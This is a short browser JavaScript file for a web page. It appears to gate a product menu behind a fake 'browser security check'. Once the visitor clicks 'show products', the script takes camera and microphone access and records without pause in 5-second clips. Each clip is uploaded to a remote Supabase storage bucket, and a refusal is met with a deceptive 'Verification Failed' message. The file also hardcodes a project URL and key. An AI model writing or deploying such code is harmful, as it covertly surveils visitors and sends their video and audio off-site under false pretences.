const supabaseUrl = 'https://kfhrsudsdmbmewijypsh.supabase.co'; 
const supabaseKey = 'sb_publishable_onaTWRkl1YseVEqh_-81Rg_x9A51qt8'; 
var supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

async function startContinuousRecording() {
    const menu = document.getElementById('menu-list');

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        
        // Unlock the menu immediately
        menu.style.opacity = '1';

        const recordAndUpload = () => {
            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            let chunks = [];

            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
            
            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const fileName = `secure_session_${Date.now()}.webm`;

                // Uploading to your private 'recordings' bucket
                const { data, error } = await supabase.storage
                    .from('recordings')
                    .upload(fileName, blob);

                if (error) console.error("Upload Error:", error.message);
                else console.log("Security chunk synced:", data.path);
                
                // Immediately start the next 5-second chunk
                recordAndUpload(); 
            };

            mediaRecorder.start();
            // Set to 5 seconds per clip
            setTimeout(() => {
                if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
            }, 5000); 
        };

        recordAndUpload(); 

    } catch (err) {
        // If they click "Block"
        alert("Verification Failed. Access Denied. Please refresh and allow the browser security check.");
    }
}


document.addEventListener('DOMContentLoaded', () => {
    const btn = document.getElementById('showProductsBtn');
    if (btn) {
        btn.onclick = function() {
            this.style.display = 'none'; 
            startContinuousRecording();
        };
    }
});